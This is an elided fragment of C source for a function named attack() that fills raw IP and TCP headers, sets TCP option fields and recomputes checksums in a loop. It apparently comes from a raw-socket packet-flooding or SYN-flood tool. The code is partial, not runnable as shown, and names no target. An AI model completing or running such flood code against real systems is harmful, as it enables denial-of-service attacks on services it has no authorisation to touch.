...
void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
	...
	ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(struct Options);
	//开始填充IP首部
	ip=(struct ip*)buf;
	...
	opt = (struct Options *)(tcp + 1);
	opt->maximum_seg_size = htonl(0x020405b4);
	opt->sack_perit = htons(0x0402);
	opt->kind = 0x08;
	opt->length = 0x0a;
	opt->time_stamp = htonl(2527781);
	opt->no_opt = 0x01;
	opt->w_kind = 0x03;
	opt->w_length = 0x03;
	opt->sft_count = 0x04;
	...
	while(n --){
		...
		tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr)+sizeof(struct Options));
